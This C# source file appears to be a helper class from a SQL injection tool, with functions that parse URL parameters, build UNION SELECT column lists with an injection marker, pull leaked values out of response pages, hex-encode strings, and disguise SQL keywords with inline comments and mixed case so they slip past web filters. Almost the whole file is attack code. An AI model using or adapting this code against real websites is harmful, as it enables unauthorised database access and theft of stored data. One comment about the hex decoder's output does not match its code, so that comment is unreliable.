using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace SQl_SCanner
{
    class chaine
    {
        public string genParamParIndex(List<string> _param,int start = 0, int fin = -1)
        {
            string bind = string.Empty;
            for (int i = start; i < fin; i++)
            {
                if (i == 0) { bind += _param[i]; }
                else { bind += "&" + _param[i]; }
            }
            return bind;
        }
        public string ViderDernierParam(string param)
        {
            string bind = string.Empty;
            List<string> _param = new List<string> { };
            string Tparam = "?" + param.Split('?')[1];
            string[] pa = Tparam.Split('&');
            _param.AddRange(pa);
            for (int i = 0; i < _param.Count; i++)
            {
                if (i + 1 == _param.Count)
                {
                    bind += escapeParam(_param[i]);
                }
                else //(i == 0 && i != _param.Count)
                {
                    bind += _param[i];
                }
            }
            return bind;
        }
        public List<string> analyseParam(string url)
        {
            List<string> _param = new List<string> { };
            if (url.Contains("?"))
            {
                string Tparam = "?" + url.Split('?')[1];
                string[] param = Tparam.Split('&');
                _param.AddRange(param);
            }
            return _param;
        }
        public string escapeParam(string param)
        {
            return param.Split('=')[0] + "=";
        }
        public string genNbrColonneVise(int nbr_table, int index_var = -1)
        {
            string bind = string.Empty;
            for (int i = 1; i <= nbr_table + 1; i++)
            {
                if (i + 1 > nbr_table + 1) 
                { 
                    bind += i; 
                }
                else if (i == index_var)
                {
                    bind += "[t],";
                }
                else 
                { 
                    bind += i + ","; 
                }
            }
            return bind;
        }
        public string extResult(string separateur, string page)
        {
            string result = string.Empty;
            if(page.Contains(separateur))
            {
               result = page.Split(new string[] { separateur }, StringSplitOptions.None)[1];
               // result = Regex.Split(page, separateur + "(.*?)" + separateur)[1];
               // result = Regex.Split(page, separateur + ">(.[a-z]+[^abc])<" + separateur)[1];
                return result;
            }
            else
            {
                return string.Empty;
            }
        }
        public string[] extSubResult(string s_separateur, string str)
        {
            string[] result = {};
            if (str.Contains(s_separateur))
            {
                result = str.Split(new string[] { s_separateur }, StringSplitOptions.None);
                return result;
            }
            else
            {
                return result;
            }
        }
        public string regexHtmlScape(string str)
        {
            Match match = Regex.Match(str, @"(.*?)<",
            RegexOptions.Singleline);
            if (match.Groups[0].Success)
            {
                return match.Groups[0].Value.Replace("<", string.Empty);
            }
            else
            {
                return str;
            }
        }

        public string Encode(string url)
        {
            string com = "%2f**%2f";
            url = url.Replace("select", com + "sElEcT");
            url = url.Replace("from", com + "fRoM");
            url = url.Replace("union", com + "uNiOn");
            url = url.Replace("group_concat", com + "gRoUp_cOnCaT");
            url = url.Replace("concat", com + "cOnCaT");
            url = url.Replace("limit", com + "lImIt");
            url = url.Replace("group by", com + "gRoUp" + com + "bY");
            url = url.Replace("unhex", com + "uNhEx");
            url = url.Replace("hex", com + "hEx");
            url = url.Replace("schemata", com + "sChEmAtA");
            url = url.Replace("table_name", com + "tAbLe_nAmE");
            url = url.Replace("table_schema", com + "tAbLe_sChEmA");
            url = url.Replace("tables", com + "tAbLeS");
            url = url.Replace("column_name", com + "cOlUmN_NaMe");
            url = url.Replace("columns", com + "cOlUmNs");
            url = url.Replace("version", com + "vErSiOn");
            url = url.Replace("distinct", com + "dIsTiNcT");
            url = url.Replace("all", com + "aLl");
            url = url.Replace("user", com + "uSeR");
            url = url.Replace("database", com + "dAtAbAsE");
            url = url.Replace("  ", " ");
            url = url.Replace(" ", "+");
            return url;
        }
        public string getHex(string str)
        {
            string concat = "0x";
            char[] values = str.ToCharArray();
            foreach (char letter in values)
            {
                // Get the integral value of the character.
                int value = Convert.ToInt32(letter);
                // Convert the decimal value to a hexadecimal value in string form.
                string hexOutput = String.Format("{0:X}", value);
                concat += hexOutput;
            }
            concat = concat.ToLower();
            return concat;
        }
        public string getStringHex(string hexString)
        {
            var bytes = new byte[hexString.Length / 2];
            for (var i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
            }
            return Encoding.Unicode.GetString(bytes); // returns: "Hello world" for "48656C6C6F20776F726C64"
        }
        public string RemoveLast(string str, string charactere)
        {
            if (str.Length < 1) return str;
            return str.Remove(str.ToString().LastIndexOf(charactere), charactere.Length);
        }
    }
}
